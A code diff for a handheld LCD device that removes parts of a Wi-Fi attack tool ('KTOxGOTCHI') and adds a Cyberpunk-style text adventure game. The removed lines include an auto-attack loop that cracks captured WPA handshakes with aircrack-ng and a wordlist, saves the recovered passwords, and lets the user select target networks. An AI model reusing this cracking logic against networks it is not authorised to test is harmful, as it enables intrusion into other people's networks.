-                            set_mood("happy")
-                            # Crack
-                            if os.path.exists(WORDLIST):
-                                crack_result = subprocess.run(f"aircrack-ng -w {WORDLIST} {dest} 2>/dev/null", shell=True, capture_output=True, text=True).stdout
-                                key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", crack_result)
-                                if key_match:
-                                    password = key_match.group(1)
-                                    cracked_file = os.path.join(CRACKED_DIR, f"{safe_essid}_{bssid}_{ts}.txt")
-                                    with open(cracked_file, "w") as cf:
-                                        cf.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {password}\nDate: {datetime.now().isoformat()}\n")
-                                    cracked_count += 1
-                                    save_stats()
-                                    set_mood("excited")
-                            attacked = True
-                            time.sleep(8)
-                            break
-                if attacked:
-                    break
-            if not attacked:
-                time.sleep(5)
-        except Exception as e:
-            print(f"Auto-attack error: {e}")
-            time.sleep(3)
-
-# ----------------------------------------------------------------------
-# LCD drawing (face, stats, captures, manual target list)
-# ----------------------------------------------------------------------
-def draw_face():
-    global _blink, _next_blink
-    now = time.time()
-    if _blink:
-        if now > _next_blink + 0.2:
-            _blink = False
-            _next_blink = now + random.uniform(5,10)
-    else:
-        if now >= _next_blink:
-            _blink = True
-    img = Image.new("RGB", (W, H), "#0A0000")
-    d = ImageDraw.Draw(img)
-    d.rectangle((0, 0, W, 17), fill="#8B0000")
-    d.text((4,3), "KTOxGOTCHI", font=f9, fill="#FF3333")
-    # Face
-    face_char = faces.get(mood, faces["normal"])
-    if _blink and mood == "normal":
-        face_char = "(◕‿‿◕)"
-    face_color = "#00FF00" if capture_event.is_set() else "#666666"
-    if capture_flash > 0:
-        face_color = "#FFFF00"
-    if stealth_enabled:
-        face_color = "#8800FF"
-    try:
-        face_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
-    except:
-        face_font = f14
-    bbox = d.textbbox((0,0), face_char, font=face_font)
-    fw = bbox[2] - bbox[0]
-    fx = (W - fw) // 2
-    d.text((fx, 20), face_char, font=face_font, fill=face_color)
-    d.line([(0, 41), (W, 41)], fill="#333")
-    y = 43
-    with lock:
-        aps = len(session_aps)
-        cli = len(session_clients)
-        hs = session_handshakes
-        hhs = session_half_hs
-        pm = session_pmkid
-        deauths = session_deauths
-        last = last_capture_ssid
-    total_pwnd = hs + hhs + pm
-    lt_total = lifetime_handshakes + lifetime_half_hs + lifetime_pmkid
-    d.text((2, y), f"AP:{aps}  CLI:{cli}", font=f9, fill="#FFBBBB"); y += 12
-    d.text((2, y), f"PWND:{total_pwnd}  LT:{lt_total}", font=f9, fill="#00FF00" if total_pwnd else "#888"); y += 12
-    d.text((2, y), f"CRACKED:{cracked_count}", font=f9, fill="#FFFF00"); y += 12
-    if last:
-        d.text((2, y), f">{last[:20]}", font=f9, fill="#00FF00"); y += 12
-    elapsed = int(time.time() - start_time)
-    uptime = f"{elapsed//3600:02d}:{(elapsed%3600)//60:02d}:{elapsed%60:02d}"
-    d.text((2, y), f"UP:{uptime}", font=f9, fill="#888")
-    d.text((4, H-30), f"Mode: {'AUTO' if auto_attack else 'MANUAL'}", font=f9, fill="#AAAAAA")
-    d.rectangle((0, H-12, W, H), fill="#220000")
-    d.text((4, H-10), "K1=View K2=Auto K3=Exit", font=f9, fill="#FF7777")
-    LCD.LCD_ShowImage(img, 0, 0)
-
-def draw_stats():
-    img = Image.new("RGB", (W, H), "#0A0000")
-    d = ImageDraw.Draw(img)
-    d.rectangle((0, 0, W, 17), fill="#8B0000")
-    d.text((4,3), "STATS", font=f9, fill="#FF3333")
-    y = 20
-    with lock:
-        d.text((4, y), f"Full HS: {session_handshakes}", font=f9, fill="#FFBBBB"); y += 12
-        d.text((4, y), f"Half HS: {session_half_hs}", font=f9, fill="#FFBBBB"); y += 12
-        d.text((4, y), f"PMKID: {session_pmkid}", font=f9, fill="#FFBBBB"); y += 12
-        d.text((4, y), f"Deauths: {session_deauths}", font=f9, fill="#FFBBBB"); y += 12
-        d.text((4, y), f"Peers: {len(peers_detected)}", font=f9, fill="#FFBBBB"); y += 12
-    d.text((4, H-30), "Lifetime totals:", font=f9, fill="#AAAAAA"); y = H-18
-    d.text((4, y), f"HS:{lifetime_handshakes} H:{lifetime_half_hs} P:{lifetime_pmkid}", font=f9, fill="#888")
-    d.rectangle((0, H-12, W, H), fill="#220000")
-    d.text((4, H-10), "K1=Back K3=Exit", font=f9, fill="#FF7777")
-    LCD.LCD_ShowImage(img, 0, 0)
-
-def draw_captures(scroll):
-    img = Image.new("RGB", (W, H), "#0A0000")
-    d = ImageDraw.Draw(img)
-    d.rectangle((0, 0, W, 17), fill="#8B0000")
-    d.text((4,3), "CAPTURES", font=f9, fill="#FF3333")
-    files = [f for f in os.listdir(HANDSHAKE_DIR) if f.endswith(".cap")]
-    files.sort(reverse=True)
-    if files:
-        visible = files[scroll:scroll+6]
-        y = 20
-        for fname in visible:
-            d.text((4, y), fname[:20], font=f9, fill="#FFBBBB")
-            y += 12
-        d.text((4, H-30), f"{len(files)} total", font=f9, fill="#AAAAAA")
-    else:
-        d.text((4, 40), "No captures yet", font=f9, fill="#888")
-    d.rectangle((0, H-12, W, H), fill="#220000")
-    d.text((4, H-10), "U/D:Scroll K1:Back K3:Exit", font=f9, fill="#FF7777")
-    LCD.LCD_ShowImage(img, 0, 0)
-
-def draw_target_list():
-    global networks, selected_idx
-    if not networks:
-        draw_face()
-        return
-    net = networks[selected_idx]
-    lines = [
-        f"Target: {net['essid'][:16]}",
-        f"BSSID: {net['bssid']}",
-        f"Channel: {net['channel']}",
-        f"Selected: {selected_idx+1}/{len(networks)}",
-        "",
-        "UP/DN OK to attack K3=back"
-    ]
-    img = Image.new("RGB", (W, H), "#0A0000")
-    d = ImageDraw.Draw(img)
-    d.rectangle((0, 0, W, 17), fill="#8B0000")
-    d.text((4, 3), "SELECT TARGET", font=f9, fill="#FF3333")
-    y = 20
-    for line in lines:
-        d.text((4, y), line[:23], font=f9, fill="#FFBBBB")
+def display_text(lines, title=None):
+    image = Image.new("RGB", (W, H), "BLACK")
+    draw = ImageDraw.Draw(image)
+    y = 2
+    if title:
+        draw.text((2, y), title.upper(), font=FONT_BOLD, fill="CYAN")
         y += 12
-    d.rectangle((0, H-12, W, H), fill="#220000")
-    d.text((4, H-10), "UP/DN OK K3=Back", font=f9, fill="#FF7777")
-    LCD.LCD_ShowImage(img, 0, 0)
+        draw.line((0, y-2, W, y-2), fill="WHITE")
+    for line in lines[:8]:
+        draw.text((2, y), line, font=FONT, fill="WHITE")
+        y += 11
+    LCD.LCD_ShowImage(image, 0, 0)
+
+def menu_choice(options, title="SELECT"):
+    idx = 0
+    while True:
+        lines = [title, "-" * 18]
+        for i, opt in enumerate(options):
+            prefix = "> " if i == idx else "  "
+            lines.append(f"{prefix}{opt}")
+        display_text(lines)
+        btn = wait_btn()
+        if btn == "UP":
+            idx = (idx - 1) % len(options)
+        elif btn == "DOWN":
+            idx = (idx + 1) % len(options)
+        elif btn == "OK":
+            wait_for_release("OK")
+            return idx
+        elif btn == "KEY2":
+            return -1
+        elif btn == "KEY3":
+            sys.exit(0)
+
+def show_message(text, wait=True):
+    pages = []
+    for line in text.split("\n"):
+        pages.extend(wrap_text(line))
+    page = 0
+    while page < len(pages):
+        lines = pages[page:page+8]
+        display_text(lines, title="MESSAGE")
+        btn = wait_btn()
+        if btn == "OK":
+            page += 8
+        elif btn == "KEY2":
+            return "hub"
+        elif btn == "KEY3":
+            sys.exit(0)
+    if wait:
+        wait_btn(timeout=2)
+
+def prompt_yes_no(question):
+    while True:
+        lines = wrap_text(question, width=18)
+        lines.append("")
+        lines.append("> Yes")
+        lines.append("  No")
+        display_text(lines, title="CHOOSE")
+        btn = wait_btn()
+        if btn == "OK":
+            return True
+        elif btn == "KEY1":
+            return False
+        elif btn == "KEY2":
+            return None
+        elif btn == "KEY3":
+            sys.exit(0)
+        time.sleep(0.1)
+
+# ----------------------------------------------------------------------
+# Game Engine
+# ----------------------------------------------------------------------
+class Game:
+    def __init__(self):
+        self.inventory = []
+        self.flags = {}
+        self.scene = "start_menu"
+        self.running = True
+        self.rep_arasaka = 0
+        self.rep_militech = 0
+        self.rep_voodoo = 0
+        self.rep_netwatch = 0
+        self.street_cred = 0
+        self.crew = []
+        self.crew_loyalty = 50
+        self.romance = None
+        self.health = 100
+        self.eddies = 500
+        self.equipped_weapon = None
+        self.equipped_cyberware = None
+        self.player_name = "Niko"
+
+    # ---------- Save / Load ----------
+    def save_game(self):
+        data = {
+            "inventory": self.inventory,
+            "flags": self.flags,
+            "scene": self.scene,
+            "rep_arasaka": self.rep_arasaka,
+            "rep_militech": self.rep_militech,
+            "rep_voodoo": self.rep_voodoo,
+            "rep_netwatch": self.rep_netwatch,
+            "street_cred": self.street_cred,
+            "crew": self.crew,
+            "crew_loyalty": self.crew_loyalty,
+            "romance": self.romance,
+            "health": self.health,
+            "eddies": self.eddies,
+            "equipped_weapon": self.equipped_weapon,
+            "equipped_cyberware": self.equipped_cyberware,
+        }
+        try:
+            with open(SAVE_FILE, "w") as f:
+                json.dump(data, f, indent=2)
+            return True
+        except:
+            return False
+
+    def load_game(self):
+        try:
+            with open(SAVE_FILE, "r") as f:
+                data = json.load(f)
+            self.inventory = data.get("inventory", [])
+            self.flags = data.get("flags", {})
+            self.scene = data.get("scene", "afterlife_hub")
+            self.rep_arasaka = data.get("rep_arasaka", 0)
+            self.rep_militech = data.get("rep_militech", 0)
+            self.rep_voodoo = data.get("rep_voodoo", 0)
+            self.rep_netwatch = data.get("rep_netwatch", 0)
+            self.street_cred = data.get("street_cred", 0)
+            self.crew = data.get("crew", [])
+            self.crew_loyalty = data.get("crew_loyalty", 50)
+            self.romance = data.get("romance", None)
+            self.health = data.get("health", 100)
+            self.eddies = data.get("eddies", 500)
+            self.equipped_weapon = data.get("equipped_weapon", None)
+            self.equipped_cyberware = data.get("equipped_cyberware", None)
+            return True
+        except:
+            return False
+
+    # ---------- Inventory (KEY1) ----------
+    def open_inventory(self):
+        while True:
+            opts = ["USE ITEM", "VIEW CREW", "EQUIP WEAPON", "BACK"]
+            choice = menu_choice(opts, title="INVENTORY")
+            if choice == -1 or choice == 3:
+                return
+            elif choice == 0:
+                if not self.inventory:
+                    show_message("Empty.")
+                else:
+                    idx = menu_choice(self.inventory, title="Use which?")
+                    if idx == -1: continue
+                    item = self.inventory[idx]
+                    if item == "MaxDoc":
+                        self.health = min(100, self.health + 30)
+                        self.inventory.pop(idx)
+                        show_message("Health +30.")
+                    else:
+                        show_message(f"{item} can't be used here.")
+            elif choice == 1:
+                if not self.crew:
+                    show_message("No crew.")
+                else:
+                    menu_choice(self.crew, title="CREW")
+            elif choice == 2:
+                weapons = [w for w in self.inventory if "Pistol" in w or "SMG" in w or "Katana" in w]
+                if not weapons:
+                    show_message("No weapons.")
+                else:
+                    idx = menu_choice(weapons, title="Equip")
+                    if idx != -1:
+                        self.equipped_weapon = weapons[idx]
+                        show_message(f"Equipped {weapons[idx]}.")
+
+    # ---------- Extended Story Missions ----------
+    def mission_select(self):
+        if "intro_done" not in self.flags:
+            self.story_intro()
+        elif "heist_started" not in self.flags:
+            self.story_the_heist()
+        elif "heist_complete" not in self.flags:
+            self.story_heist_escape()
+        elif "voodoo_done" not in self.flags:
+            self.story_voodoo_boys()
+        elif "militech_done" not in self.flags:
+            self.story_militech_conflict()
+        else:
+            self.story_finale()
+
+    def story_intro(self):
+        show_message("Night City, 2087. Niko, a merc trying to make a name.")
+        show_message("A fixer named Rook contacts you. 'Got a gig. Interested?'")
+        if prompt_yes_no("Take the job?"):
+            self.flags["intro_done"] = True
+            self.eddies += 200
+            show_message("Rook: 'Meet me at the Afterlife.'")
+        else:
+            show_message("You decline. (Game Over)")
+            self.running = False
+
+    def story_the_heist(self):
+        show_message("ACT 1: The Heist\nRook wants you to steal a prototype chip from a Militech convoy.")
+        self.flags["heist_started"] = True
+        self.crew = ["Nova", "Glitch"]
+        self.crew_loyalty = {"Nova": 60, "Glitch": 70}
+        show_message("Your crew: Nova (solo) and Glitch (netrunner).")
+        enemies = [Combatant("Militech Guard", 30, 8), Combatant("Militech Guard", 30, 8)]
+        player = Combatant("Niko", self.health, attack=12)
+        crew_combat = [Combatant(n, 40, 10) for n in self.crew]
+        result = combat_encounter([player] + crew_combat, enemies, self)
+        if result == "hub":
+            return
+        if result:
+            show_message("You grab the chip. But alarms blare!")
+            self.flags["heist_complete"] = False
+            self.story_heist_escape()
+        else:
+            show_message("You flatline. Game Over.")
+            self.running = False
+
+    def story_heist_escape(self):
+        show_message("Escape! Militech elites are on your tail.")
+        enemies = [Combatant("Militech Elite", 45, 12)]
+        player = Combatant("Niko", self.health, attack=12)
+        crew_combat = [Combatant(n, 40, 10) for n in self.crew]
+        result = combat_encounter([player] + crew_combat, enemies, self)
+        if result == "hub":
+            return
+        if result:
+            show_message("You escape, but Nova is badly hurt.")
+            self.flags["heist_complete"] = True
+            self.flags["voodoo_done"] = False
+            self.eddies += 2000
+            if isinstance(self.crew_loyalty, dict):
+                self.crew_loyalty["Nova"] -= 10
+        else:
+            show_message("You died. Game Over.")
+            self.running = False
+
+    def story_voodoo_boys(self):
+        show_message("ACT 2: Voodoo Secrets\nYou need to decode the chip. The Voodoo Boys can help.")
+        show_message("Their leader, Sable, demands you deal with a NetWatch agent first.")
+        if prompt_yes_no("Help Sable?"):
+            enemies = [Combatant("NetWatch Agent", 40, 10), Combatant("NetWatch Drone", 25, 8)]
+            player = Combatant("Niko", self.health, attack=14)
+            crew_combat = [Combatant(n, 40, 10) for n in self.crew]
+            result = combat_encounter([player] + crew_combat, enemies, self)
+            if result == "hub":
+                return
+            if result:
+                self.rep_voodoo += 20
+                self.rep_netwatch -= 10
+                show_message("Sable decodes the chip. It contains coordinates to an old Arasaka facility.")
+                self.flags["voodoo_done"] = True
+                self.crew.append("Sable")
+                if isinstance(self.crew_loyalty, dict):
+                    self.crew_loyalty["Sable"] = 50
+        else:
+            show_message("You refuse. The Voodoo Boys become hostile.")
+
+    def story_militech_conflict(self):
+        show_message("ACT 3: Militech Wants the Chip Back")
+        show_message("Vector, a Militech operative, offers you a deal.")
+        choice = menu_choice(["Side with Militech", "Fight them"], "Choose:")
+        if choice == 0:
+            self.rep_militech += 30
+            show_message("You give them the chip. They pay you 5000€$.")
+            self.eddies += 5000
+            self.flags["militech_done"] = True
+        else:
+            enemies = [Combatant("Vector", 60, 15), Combatant("Militech Soldier", 40, 10)]
+            player = Combatant("Niko", self.health, attack=15)
+            crew_combat = [Combatant(n, 40, 10) for n in self.crew]
+            result = combat_encounter([player] + crew_combat, enemies, self)
+            if result == "hub":
+                return
+            if result:
+                show_message("You defeat Vector. Militech will hunt you.")
+                self.rep_militech -= 50
+                self.flags["militech_done"] = True
+
+    def story_finale(self):
+        show_message("ACT 4: The Arasaka Facility")
+        show_message("You discover the chip leads to a secret AI project.")
+        boss = Combatant("Arasaka Cyborg", 80, 20, abilities=[("Overcharge", 2.0)])
+        player = Combatant("Niko", self.health, attack=18)
+        crew_combat = [Combatant(n, 50, 12) for n in self.crew]
+        result = combat_encounter([player] + crew_combat, [boss], self)
+        if result == "hub":
+            return
+        if result:
+            show_message("You destroy the AI and escape. Night City legend status achieved.")
+            show_message("THE END. Thanks for playing!")
+            self.running = False
+        else:
+            show_message("You died a hero. Game Over.")
+            self.running = False
+
+    # ---------- Original Hub and Scene Methods ----------
+    def _wrap(self, text):
+        return textwrap.wrap(text, width=23)
+
+    def show_text(self, raw_lines, title="2087"):
+        all_lines = []
+        for line in raw_lines:
+            if not line.strip():
+                all_lines.append("")
+            else:
+                all_lines.extend(self._wrap(line))
+        pages = [all_lines[i:i+5] for i in range(0, len(all_lines), 5)]
+        if not pages:
+            pages = [["(nothing)"]]
+        page_idx = 0
+        while True:
+            lines = pages[page_idx]
+            img = Image.new("RGB", (W, H), (10, 0, 0))
+            d = ImageDraw.Draw(img)
+            d.rectangle((0, 0, W, 13), fill=(139, 0, 0))
+            d.text((4, 2), title[:20], font=FONT_BOLD, fill=(231, 76, 60))
+            y = 16
+            for line in lines:
+                d.text((4, y), line[:23], font=FONT, fill=(171, 178, 185))
+                y += 12
+            if len(pages) > 1:
+                d.text((W-15, H-12), f"{page_idx+1}/{len(pages)}", font=FONT, fill=(192,57,43))
+            inv_str = f"HP:{self.health} E:{self.eddies}"
+            rep_str = f"A:{self.rep_arasaka} M:{self.rep_militech}"
+            d.text((4, H-12), f"{inv_str[:12]} {rep_str}", font=FONT, fill=(192,57,43))
+            LCD.LCD_ShowImage(img, 0, 0)
+            btn = wait_btn(0.2)
+            if btn == "UP":
+                page_idx = max(0, page_idx-1)
+                wait_for_release("UP")
+            elif btn == "DOWN":
+                page_idx = min(len(pages)-1, page_idx+1)
+                wait_for_release("DOWN")
+            elif btn == "OK":
+                if page_idx < len(pages)-1:
+                    page_idx += 1
+                else:
+                    wait_for_release("OK")
+                    return
+                wait_for_release("OK")
+            elif btn == "KEY2":
+                wait_for_release("KEY2")
+                self.scene = "afterlife_hub"
+                return
+            elif btn == "KEY3":
+                wait_for_release("KEY3")
+                self.running = False
+                return
+
+    def choose(self, choices, title="2087"):
+        if not choices:
+            return None
+        selected = 0
+        while True:
+            img = Image.new("RGB", (W, H), (10, 0, 0))
+            d = ImageDraw.Draw(img)
+            d.rectangle((0, 0, W, 13), fill=(139, 0, 0))
+            d.text((4, 2), title[:20], font=FONT_BOLD, fill=(231, 76, 60))
+            y = 16
+            start = max(0, selected - 2)
+            end = min(len(choices), start + 5)
+            visible = choices[start:end]
+            for i, ch in enumerate(visible):
+                actual_idx = start + i
+                if actual_idx == selected:
+                    d.rectangle((0, y-1, W, y+9), fill=(60, 0, 0))
+                    d.text((4, y), f"> {ch[:21]}", font=FONT, fill=(255, 255, 255))
+                else:
+                    d.text((4, y), f"  {ch[:21]}", font=FONT, fill=(171, 178, 185))
+                y += 12
+            if len(choices) > 5:
+                d.text((W-10, H-12), f"{selected+1}/{len(choices)}", font=FONT, fill=(192,57,43))
+            inv_str = f"HP:{self.health} E:{self.eddies}"
+            rep_str = f"A:{self.rep_arasaka} M:{self.rep_militech}"
+            d.text((4, H-12), f"{inv_str[:12]} {rep_str}", font=FONT, fill=(192,57,43))
+            LCD.LCD_ShowImage(img, 0, 0)
+            btn = wait_btn(0.2)
+            if btn == "UP":
+                selected = max(0, selected-1)
+                wait_for_release("UP")
+            elif btn == "DOWN":
+                selected = min(len(choices)-1, selected+1)
+                wait_for_release("DOWN")
+            elif btn == "OK":
+                wait_for_release("OK")
+                return selected
+            elif btn == "KEY2":
+                wait_for_release("KEY2")
+                self.scene = "afterlife_hub"
+                return None
+            elif btn == "KEY3":
+                wait_for_release("KEY3")
+                self.running = False
+                return None
+
+# =============================================================================
+# SCENE DEFINITIONS (all 120+ original scenes – fully included)
+# =============================================================================
+def scene_start_menu(g):
+    g.show_text(["Cyberpunk 2087", "Choose an option:"])
+    choices = ["New Game", "Continue"]
+    idx = g.choose(choices)
+    if idx == 0:
+        g.__init__()
+        g.scene = "start"
+        return "start"
+    else:
+        if g.load_game():
+            g.show_text(["Game loaded.", f"Returning to {g.scene}"])
+            return g.scene
+        else:
+            g.show_text(["No save file found.", "Starting new game."])
+            g.scene = "start"
+            return "start"
+
+def scene_start(g):
+    g.show_text([
+        ">>> 2087 <<<",
+        "Night City. The neon never dies. Arasaka is a ghost, Militech runs the streets.",
+        "You are Niko. Twenty-three, chromeless, broke. You heard a rumor:",
+        "A netrunner named Lucy still haunts the old networks. Some say she's looking for a crew.",
+        "You don't believe in ghosts. But you believe in eddies."
+    ])
+    choices = ["Go to the Afterlife", "Scavenge the Combat Zone", "Visit Kabuki market"]
+    idx = g.choose(choices)
+    if idx == 0: return "afterlife_hub"
+    elif idx == 1: return "combat_zone"
+    else: return "kabuki"
+
+# --------------------- CENTRAL HUB: AFTERLIFE (with Story Missions) ---------------------
+def scene_afterlife_hub(g):
+    g.show_text([
+        "The Afterlife. A drink called 'David Martinez' is still the bestseller.",
+        f"Health: {g.health} | Eddies: {g.eddies}",
+        "Who do you want to talk to?"
+    ])
+    choices = ["Story Missions", "Talk to Fixer (side gigs)", "Talk to Bartender (food/rumors)", "Visit Shop", "Talk to your crew", "Save Game", "Leave"]
+    idx = g.choose(choices)
+    if idx == 0:
+        g.mission_select()
+        return "afterlife_hub"
+    elif idx == 1: return "fixer_gigs"
+    elif idx == 2: return "bartender"
+    elif idx == 3: return "shop"
+    elif idx == 4: return "crew_hub"
+    elif idx == 5:
+        if g.save_game():
+            g.show_text(["Game saved."])
+        else:
+            g.show_text(["Save failed."])
+        return "afterlife_hub"
+    else: return "street"
+
+def scene_fixer_gigs(g):
+    g.show_text([
+        "Fixer: 'Niko, I got work. Militech convoy job still open.'",
+        "Also, a corpo wants a data extraction from a gang hideout."
+    ])
+    choices = ["Take Militech convoy job", "Take data extraction job", "Just browse", "Back"]
+    idx = g.choose(choices)
+    if idx == 0:
+        if g.check_flag("militech_job"):
+            g.show_text(["You already accepted this job."])
+            return "fixer_gigs"
+        else:
+            g.set_flag("militech_job")
+            g.change_reputation("militech", -1)
+            return "militech_prep"
+    elif idx == 1:
+        return "data_extraction"
+    else:
+        return "afterlife_hub"
+
+def scene_data_extraction(g):
+    g.show_text([
+        "The gang hideout is guarded. You need a weapon or stealth."
+    ])
+    if g.has_item("smart_rifle") or g.has_item("thermal_katana"):
+        g.show_text(["You fight through and get the data. +2000 eddies, +5 street cred."])
+        g.eddies += 2000
+        g.change_reputation("street", 5)
+    else:
+        g.show_text(["Without a weapon, you fail. You lose 500 eddies."])
+        g.eddies = max(0, g.eddies - 500)
+    return "afterlife_hub"
+
+def scene_bartender(g):
+    g.show_text([
+        "Bartender: 'Want something to eat? Synthetic meat (20 eddies, +20 HP) or real burger (50 eddies, +35 HP).'"
+    ])
+    choices = ["Buy synthetic meat", "Buy real burger", "Just chat", "Back"]
+    idx = g.choose(choices)
+    if idx == 0:
+        if g.eddies >= 20:
+            g.eddies -= 20
+            g.add_item("synthetic_meat")
+            g.show_text(["You bought synthetic meat."])
+        else:
+            g.show_text(["Not enough eddies."])
+    elif idx == 1:
+        if g.eddies >= 50:
+            g.eddies -= 50
+            g.add_item("real_burger")
+            g.show_text(["You bought a real burger."])
+        else:
+            g.show_text(["Not enough eddies."])
+    elif idx == 2:
+        g.show_text(["Bartender: 'Heard Militech is up to something. Also, Lucy might be in Pacifica.'"])
+    return "afterlife_hub"
+
+def scene_shop(g):
+    g.show_text([
+        "Shopkeeper: 'What do you need? Weapons, cyberware, medkits?'"
+    ])
+    choices = ["Smart rifle (2000 eddies)", "Optical camo (1500 eddies)", "Medkit (100 eddies)", "Back"]
+    idx = g.choose(choices)
+    if idx == 0:
+        if g.eddies >= 2000:
+            g.eddies -= 2000
+            g.add_item("smart_rifle")
+            g.show_text(["You bought a smart rifle."])
+        else:
+            g.show_text(["Not enough eddies."])
+    elif idx == 1:
+        if g.eddies >= 1500:
+            g.eddies -= 1500
+            g.add_item("optical_camo")
+            g.show_text(["You bought optical camo."])
+        else:
+            g.show_text(["Not enough eddies."])
+    elif idx == 2:
+        if g.eddies >= 100:
+            g.eddies -= 100
+            g.add_item("medkit")
+            g.show_text(["You bought a medkit."])
+        else:
+            g.show_text(["Not enough eddies."])
+    return "afterlife_hub"
+
+def scene_crew_hub(g):
+    if not g.crew:
+        g.show_text(["You have no crew yet. Recruit Maya (solo), Jin (netrunner), or Lina (techie)."])
+        return "afterlife_hub"
+    g.show_text([f"Your crew: {', '.join(g.crew)}. Loyalty: {g.crew_loyalty}%"])
+    choices = ["Talk to Maya", "Talk to Jin", "Talk to Lina", "Back"]
+    idx = g.choose(choices)
+    if idx == 0 and "solo" in g.crew:
+        return "talk_maya"
+    elif idx == 1 and "netrunner" in g.crew:
+        return "talk_jin"
+    elif idx == 2 and "techie" in g.crew:
+        return "talk_lina"
+    else:
+        return "afterlife_hub"
+
+def scene_talk_maya(g):
+    g.show_text(["Maya: 'You saved my life, Niko. I trust you. Want to grab a drink sometime?'"])
+    choices = ["Yes (romance path)", "No, just friends"]
+    idx = g.choose(choices)
+    if idx == 0:
+        g.set_romance("maya")
+        g.show_text(["You and Maya start dating. She joins you permanently."])
+        return "afterlife_hub"
+    else:
+        return "afterlife_hub"
+
+def scene_talk_jin(g):
+    g.show_text(["Jin: 'Niko, you're a good leader. I've got your back.'"])
+    return "afterlife_hub"
+
+def scene_talk_lina(g):
+    g.show_text(["Lina: 'The tech is ready. Need an upgrade?'"])
+    choices = ["Install cyberware", "Just chat", "Back"]
+    idx = g.choose(choices)
+    if idx == 0 and g.has_item("cyberdeck"):
+        g.equipped_cyberware = "cyberdeck"
+        g.show_text(["Lina installs the cyberdeck. Hacking options unlocked."])
+    elif idx == 0 and g.has_item("optical_camo"):
+        g.equipped_cyberware = "optical_camo"
+        g.show_text(["Lina installs optical camo. Stealth improved."])
+    else:
+        g.show_text(["You have no cyberware to install."])
+    return "afterlife_hub"
+
+def scene_street(g):
+    g.show_text([
+        "You step outside. Night City streets. Rain. Neon reflections.",
+        "Where to now?"
+    ])
+    choices = ["Go back to Afterlife", "Explore the Combat Zone", "Visit Kabuki market", "Go to Pacifica"]
+    idx = g.choose(choices)
+    if idx == 0: return "afterlife_hub"
+    elif idx == 1: return "combat_zone"
+    elif idx == 2: return "kabuki"
+    else: return "pacifica_side"
+
+# --------------------- ORIGINAL SCENES (all 120+ preserved) ---------------------
+def scene_combat_zone(g):
+    g.show_text([
+        "The Combat Zone. Scavs, Maelstrom remnants, and desperate souls.",
+        "You spot a wounded solo being cornered by three thugs."
+    ])
+    choices = ["Help the solo", "Ignore and loot nearby", "Join the thugs"]
+    idx = g.choose(choices)
+    if idx == 0:
+        g.add_crew("solo")
+        g.show_text(["You fight them off. The solo introduces herself as Maya."])
+        return "maya_recruit"
+    elif idx == 1:
+        g.add_item("junk")
+        return "combat_zone_loot"
+    else:
+        g.change_reputation("street", -2)
+        return "combat_zone_bad"
+
+def scene_maya_recruit(g):
+    g.show_text([
+        "Maya: 'Thanks, choom. I'm Maya. I'm a solo. You got a crew?'",
+        "'Not yet. But I'm building one. Want in?'",
+        "She grins. 'You just saved my life. I owe you. I'm in.'"
+    ])
+    g.add_crew("solo")
+    return "afterlife_hub"
+
+def scene_combat_zone_loot(g):
+    g.show_text(["You find a damaged cyberdeck. It might work."])
+    g.add_item("broken_cyberdeck")
+    return "afterlife_hub"
+
+def scene_combat_zone_bad(g):
+    g.show_text(["The thugs kill the solo. They turn on you. You barely escape."])
+    return "afterlife_hub"
+
+def scene_kabuki(g):
+    g.show_text([
+        "Kabuki market. Smells of noodles and ozone.",
+        "A street vendor whispers: 'You looking for a netrunner? I know one.'"
+    ])
+    choices = ["Follow the vendor", "Ignore and look yourself", "Buy a hot dog"]
+    idx = g.choose(choices)
+    if idx == 0: return "vendor_netrunner"
+    elif idx == 1: return "kabuki_search"
+    else: return "kabuki_hotdog"
+
+def scene_vendor_netrunner(g):
+    g.show_text([
+        "The vendor leads you to a basement. A figure in a hooded jacket sits at a terminal.",
+        "'Name's Jin. I heard you need a netrunner. I'm the best in Kabuki.'"
+    ])
+    choices = ["Hire Jin (500 eddies)", "Promise a cut of future jobs", "Leave"]
+    idx = g.choose(choices)
+    if idx == 0 and g.eddies >= 500:
+        g.eddies -= 500
+        g.add_crew("netrunner")
+        return "jin_crew"
+    elif idx == 1:
+        g.set_flag("debt_to_jin")
+        g.add_crew("netrunner")
+        return "jin_crew"
+    else:
+        return "kabuki"
+
+def scene_jin_crew(g):
+    g.show_text(["Jin: 'Alright, Niko. I'll join your crew. Just don't get me killed.'"])
+    return "afterlife_hub"
+
+def scene_kabuki_search(g):
+    g.show_text(["You search the market but find no netrunner. Just junk."])
+    g.add_item("junk")
+    return "afterlife_hub"
+
+def scene_kabuki_hotdog(g):
+    g.show_text(["The hot dog is surprisingly good. +5 morale."])
+    return "afterlife_hub"
+
+def scene_militech_prep(g):
+    g.show_text([
+        "You prepare for the Militech job. You need more firepower.",
+        "Maya (solo) suggests hitting a weapon stash."
+    ])
+    choices = ["Hit the weapon stash", "Go alone to the convoy", "Find a techie first"]
+    idx = g.choose(choices)
+    if idx == 0: return "weapon_stash"
+    elif idx == 1: return "convoy_alone"
+    else: return "find_techie"
+
+def scene_weapon_stash(g):
+    g.show_text([
+        "You and Maya break into a Militech armory. Guards everywhere.",
+        "Maya distracts them. You grab a smart rifle and a thermal katana."
+    ])
+    g.add_item("smart_rifle")
+    g.add_item("thermal_katana")
+    return "convoy"
+
+def scene_convoy_alone(g):
+    g.show_text([
+        "You ambush the convoy alone. Outnumbered, you nearly die.",
+        "But you manage to grab the prototype neural processor."
+    ])
+    g.add_item("prototype_neural_processor")
+    g.change_reputation("militech", -3)
+    return "after_convoy"
+
+def scene_find_techie(g):
+    g.show_text([
+        "You ask around for a techie. A contact points you to a garage in Rancho Coronado.",
+        "A woman named Lina works on a heavily modified Thorton."
+    ])
+    choices = ["Hire Lina", "Fix your own gear", "Leave"]
+    idx = g.choose(choices)
+    if idx == 0:
+        g.add_crew("techie")
+        return "lina_crew"
+    else:
+        return "convoy"
+
+def scene_lina_crew(g):
+    g.show_text(["Lina: 'I'll join. But I get a 20% cut of every job.'"])
+    return "convoy"
+
+def scene_convoy(g):
+    g.show_text([
+        "With your crew ready, you hit the Militech convoy.",
+        "Jin disables their comms. Maya snipes the turrets. Lina hotwires the transport.",
+        "You grab the prototype. Success!"
+    ])
+    g.add_item("prototype_neural_processor")
+    g.eddies += 10000
+    g.change_reputation("street", 3)
+    return "after_convoy"
+
+def scene_after_convoy(g):
+    g.show_text([
+        "You return to the Afterlife. Fixer pays you 10k eddies.",
